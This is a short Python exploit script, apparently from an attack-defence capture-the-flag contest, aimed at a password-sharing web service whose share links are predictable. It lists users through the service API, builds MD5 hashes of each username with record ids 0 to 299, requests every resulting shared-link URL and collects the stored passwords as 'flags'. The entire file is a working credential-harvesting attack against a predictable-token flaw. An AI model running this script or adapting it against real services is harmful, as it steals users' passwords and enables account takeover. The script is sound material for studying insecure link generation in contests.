import requests
import json
import sys
import hashlib

PORT = 8000
NUM = 300


def get_users(r):
    users = []
    for i in range(len(json.loads(r))):
        users.append(json.loads(r)[i]["username"])
    return users


def get_link(username, record_id):
    str2hash = f"{username}{record_id}"
    link = hashlib.md5(str2hash.encode())
    return link


def main():
    """
    Предсказуемая генерация ссылки для шаринга пароля
    """
    args = sys.argv[1:]
    url = f'http://{args[0]}:{PORT}/api'
    r = requests.get(f'{url}/get_users')
    flags = []
    if r.status_code == 200:
        users = get_users(r.text)
    flags = []
    for i in users:
        for j in range(NUM):
            link = get_link(i, j)
            r = requests.get(f'{url}/shared_link?shared_password_link={link.hexdigest()}')
            if r.status_code == 200:
                print(r.text)
                flags.append(json.loads(r.text)["password"])
    return flags


if __name__ == "__main__":
    print(main())
